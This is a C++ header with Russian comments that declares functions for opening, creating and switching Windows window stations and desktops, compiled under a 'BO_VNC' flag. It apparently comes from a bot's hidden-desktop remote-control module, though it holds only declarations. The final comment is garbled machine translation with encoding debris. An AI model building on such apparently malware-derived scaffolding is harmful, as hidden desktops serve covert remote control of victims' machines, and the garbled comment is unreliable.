/*
  Работа с Window Station's и Desktop's.

  Примечание: Т.к. данные возможности документированы очень бедно, принимаем меры максимальной
              безопасности, в обмен на размер.
*/
#pragma once

#if(BO_VNC > 0)
namespace WindowStation
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Получение имени объекта.

    IN handle - объект.

    Return    - имя объекта, необходимо освободить через Mem. Или NULL в случаи ошибки.
  */
  LPWSTR _getObjectName(HANDLE handle);

  /*
    Проверяет указывают ли хэндлы на один и тотже объект.

    IN handle1 - объект 1.
    IN handle2 - объект 2.

    Return     - true - если хэндлы принадлежат одному и томоуже объекту,
                 false - в противном случаи.
  */
  bool _isEqualObjects(HANDLE handle1, HANDLE handle2);

  /*
    Открывает или создает станцию.
    
    IN name          - имя станции или NULL для установки Winsta0.
    IN desiredAccess - маска доступа.

    Return           - хэндл станции (нужно закарыть через CloseWindowStation),
                       или NULL в случаи ошибки.
  */
  HWINSTA _openWindowStation(const LPWSTR name, ACCESS_MASK desiredAccess);

  /*
    Установка текущей станции для процесс.

    IN handle - станция для установки.

    Return    - true - в случаи успеха,
                false - в случаи ошибки.
  */
  bool _setProcessWindowStation(HWINSTA handle);

  /*
    Открывает или создает десктоп.

    IN name          - имя декстопа или NULL для установки default.
    IN desiredAccess - маска доступа.

    Return           - хэндл десктоп (нужно закарыть через CloseDesktop),
                       или NULL в случаи ошибки.
  */
  HDESK _openDesktop(const LPWSTR name, ACCESS_MASK desiredAccess);

  /*
    Переключение текшего потока на декстоп.

    IN handle - дестоп на который следует переключиться.

    Return    - true - в случаи успеха,
                false - в случаи ошибки.
  */
  bool _setThreadDesktop(HDESK handle);

  /*В В В В Switching streamed flow on desktops.

В В В В IN stationName - station name, or NULL to install Winsta0. If the station does not suschetvuet,
В В В В В В В В В В В В В В В В В В В В В it will be created.
В В В В IN desktopName - the name of the desktops or NULL to set the default. If the desktops are not suschetvuet,
В В В В В В В В В В В В В В В В В В В В В it will be created.

В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _setThreadDesktopEx(const LPWSTR stationName, const LPWSTR desktopName);
};
#endif
